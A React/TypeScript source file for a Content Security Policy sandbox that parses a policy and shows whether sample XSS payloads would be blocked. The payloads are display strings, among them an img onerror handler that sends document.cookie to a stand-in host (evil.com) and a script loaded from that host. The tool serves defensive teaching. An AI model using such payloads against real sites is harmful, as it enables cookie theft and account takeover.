"use client";

import { useState } from "react";
import { ToolShell } from "@/components/ui/ToolShell";

// ── CSP parser ───────────────────────────────────────────────────
type CSPDirectives = Map<string, string[]>;

function parseCSP(header: string): CSPDirectives {
  const dir = new Map<string, string[]>();
  for (const part of header.split(";").map((s) => s.trim()).filter(Boolean)) {
    const tokens = part.split(/\s+/).filter(Boolean);
    if (!tokens.length) continue;
    const name = tokens[0].toLowerCase();
    const values = tokens.slice(1).map((v) => v.toLowerCase());
    dir.set(name, values);
  }
  return dir;
}

// base-uri and form-action do NOT fall back to default-src
const NO_DEFAULT_FALLBACK = new Set(["base-uri", "form-action", "sandbox", "navigate-to"]);

function getEffective(dir: CSPDirectives, name: string): string[] | null {
  if (dir.has(name)) return dir.get(name)!;
  if (!NO_DEFAULT_FALLBACK.has(name) && dir.has("default-src")) {
    return dir.get("default-src")!;
  }
  return null;
}

function includesSource(sources: string[], ...candidates: string[]): boolean {
  return candidates.some((c) => sources.includes(c));
}

function allowsInlineScript(sources: string[] | null): boolean {
  if (!sources) return true;
  if (sources.includes("'strict-dynamic'")) return false; // strict-dynamic ignores unsafe-inline
  return sources.some(
    (s) =>
      s === "'unsafe-inline'" ||
      s.startsWith("'nonce-") ||
      s.startsWith("'sha256-") ||
      s.startsWith("'sha384-") ||
      s.startsWith("'sha512-")
  );
}

function allowsExternalHost(sources: string[] | null, host: string): boolean {
  if (!sources) return true;
  if (sources.includes("'none'")) return false;
  return sources.some((s) => {
    if (s === "*" || s === "https:" || s === "http:" || s === "data:") return true;
    const bare = s.replace(/^https?:\/\//, "").split("/")[0];
    return bare === host || bare === "*" || bare === `*.${host.split(".").slice(1).join(".")}`;
  });
}

// ── Evaluation ───────────────────────────────────────────────────
interface TestResult {
  label: string;
  payload: string;
  allowed: boolean;
  note: string;
  directiveUsed: string;
}

const EVIL = "evil.com";

function evaluate(dir: CSPDirectives): TestResult[] {
  const scriptSrc = getEffective(dir, "script-src");
  const objectSrc = getEffective(dir, "object-src");
  const baseUri = getEffective(dir, "base-uri");
  const styleSrc = getEffective(dir, "style-src");

  const inlineAllowed = allowsInlineScript(scriptSrc);
  const externalAllowed = allowsExternalHost(scriptSrc, EVIL);
  const objectAllowed = objectSrc === null || !includesSource(objectSrc, "'none'");
  const baseAllowed =
    baseUri === null ||
    (!includesSource(baseUri, "'none'", "'self'") &&
      allowsExternalHost(baseUri, EVIL));
  const inlineStyleAllowed =
    !styleSrc || styleSrc.some((s) => s === "'unsafe-inline'" || s.startsWith("'nonce-"));

  return [
    {
      label: "Inline <script>",
      payload: `<script>alert(document.cookie)</script>`,
      allowed: inlineAllowed,
      directiveUsed: scriptSrc
        ? dir.has("script-src")
          ? "script-src"
          : "default-src (fallback)"
        : "none",
      note: inlineAllowed
        ? scriptSrc?.includes("'strict-dynamic'")
          ? "Blocked — 'strict-dynamic' ignores 'unsafe-inline'."
          : "⚠️ Allowed — 'unsafe-inline' in script-src permits all inline scripts. CSP gives no XSS protection."
        : scriptSrc === null
        ? "⚠️ No script-src or default-src — browser default allows inline scripts."
        : "✅ Blocked — no 'unsafe-inline', nonce, or hash in script-src.",
    },
    {
      label: `<script src="https://${EVIL}/…">`,
      payload: `<script src="https://${EVIL}/xss.js"></script>`,
      allowed: externalAllowed,
      directiveUsed: scriptSrc
        ? dir.has("script-src")
          ? "script-src"
          : "default-src (fallback)"
        : "none",
      note: externalAllowed
        ? "⚠️ Allowed — script-src permits external origins or wildcards."
        : "✅ Blocked — evil.com is not in the script-src allowlist.",
    },
    {
      label: "<object> / Flash / ActiveX",
      payload: `<object data="https://${EVIL}/exploit.swf"></object>`,
      allowed: objectAllowed,
      directiveUsed: dir.has("object-src")
        ? "object-src"
        : dir.has("default-src")
        ? "default-src (fallback)"
        : "none",
      note: !objectAllowed
        ? "✅ Blocked — object-src 'none' prevents legacy plugin-based exploits."
        : "⚠️ Allowed — add object-src 'none' to block Flash and ActiveX vectors.",
    },
    {
      label: "<base> tag injection",
      payload: `<base href="https://${EVIL}/">`,
      allowed: baseAllowed,
      directiveUsed: dir.has("base-uri") ? "base-uri" : "none (no fallback)",
      note: !baseAllowed
        ? "✅ Blocked — base-uri prevents base tag hijacking of relative URLs."
        : "⚠️ Allowed — add base-uri 'self' or 'none' to prevent base tag injection.",
    },
    {
      label: "Inline event handler",
      payload: `<img src=x onerror="fetch('https://${EVIL}/?c='+document.cookie)">`,
      allowed: inlineAllowed,
      directiveUsed: scriptSrc
        ? dir.has("script-src")
          ? "script-src"
          : "default-src (fallback)"
        : "none",
      note: inlineAllowed
        ? "⚠️ Allowed — 'unsafe-inline' in script-src also permits inline event handlers."
        : "✅ Blocked — inline event handlers are treated as inline scripts by CSP.",
    },
    {
      label: "Inline <style>",
      payload: `<style>body{background:url(https://${EVIL}/?c='+document.cookie)}</style>`,
      allowed: inlineStyleAllowed,
      directiveUsed: styleSrc
        ? dir.has("style-src")
          ? "style-src"
          : "default-src (fallback)"
        : "none",
      note: inlineStyleAllowed
        ? "⚠️ Allowed — 'unsafe-inline' in style-src permits CSS injection."
        : "✅ Blocked — inline styles are restricted.",
    },
  ];
}

const PRESETS = [
  {
    label: "Strict",
    value: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; base-uri 'self'; object-src 'none'`,
  },
  {
    label: "Weak",
    value: `default-src * 'unsafe-inline' 'unsafe-eval'`,
  },
  {
    label: "Typical SPA",
    value: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'self'`,
  },
];

export default function CSPSandboxTool() {
  const [policy, setPolicy] = useState(PRESETS[0].value);
  const [showParsed, setShowParsed] = useState(false);

  const directives = parseCSP(policy);
  const results = evaluate(directives);

  return (
    <ToolShell
      title="CSP Sandbox"
      description="Write a Content Security Policy. Directives are parsed properly — each test uses the correct directive with default-src fallback."
    >
      <div className="space-y-4">
        {/* Presets */}
        <div className="flex flex-wrap gap-1.5">
          {PRESETS.map((p) => (
            <button
              key={p.label}
              onClick={() => setPolicy(p.value)}
              className="px-3 py-1 text-xs rounded border border-subtle bg-surface-2 text-secondary hover:border-slate-400 transition-colors"
            >
              {p.label}
            </button>
          ))}
        </div>

        {/* Policy input */}
        <div>
          <label className="block text-sm font-medium text-secondary mb-1">
            Content-Security-Policy
          </label>
          <textarea
            value={policy}
            onChange={(e) => setPolicy(e.target.value)}
            className="w-full h-20 px-3 py-2 border border-subtle rounded-md font-mono text-xs focus:outline-none focus:ring-2 focus:ring-blue-500"
            spellCheck={false}
          />
        </div>

        {/* Parsed directives toggle */}
        <div>
          <button
            onClick={() => setShowParsed((v) => !v)}
            className="text-[10px] text-slate-500 hover:text-slate-300 underline"
          >
            {showParsed ? "Hide parsed directives" : "Show parsed directives"}
          </button>
          {showParsed && (
            <div className="mt-2 space-y-1">
              {directives.size === 0 ? (
                <p className="text-xs text-amber-500">No valid directives found.</p>
              ) : (
                Array.from(directives.entries()).map(([name, vals]) => (
                  <div key={name} className="flex gap-2 text-[10px] font-mono">
                    <span className="text-blue-400 w-36 shrink-0">{name}</span>
                    <span className="text-slate-400">{vals.join(" ") || "(empty)"}</span>
                  </div>
                ))
              )}
            </div>
          )}
        </div>

        {/* Test results */}
        <div className="space-y-2">
          {results.map((r, i) => (
            <div
              key={i}
              className={`p-3 rounded-lg border text-sm ${
                r.allowed ? "bg-red-50 border-red-200" : "bg-emerald-50 border-emerald-200"
              }`}
            >
              <div className="flex justify-between items-start gap-2">
                <p className="font-medium text-secondary text-xs">{r.label}</p>
                <span
                  className={`text-[10px] px-2 py-0.5 rounded shrink-0 ${
                    r.allowed
                      ? "bg-red-100 text-red-700"
                      : "bg-emerald-100 text-emerald-700"
                  }`}
                >
                  {r.allowed ? "Allowed" : "Blocked"}
                </span>
              </div>
              <p className="text-[10px] text-slate-500 mt-0.5">
                via{" "}
                <span className="font-mono text-slate-400">{r.directiveUsed}</span>
              </p>
              <p className="text-xs text-secondary mt-1">{r.note}</p>
              <p className="text-[10px] text-slate-500 mt-0.5 font-mono truncate">
                {r.payload}
              </p>
            </div>
          ))}
        </div>
      </div>
    </ToolShell>
  );
}
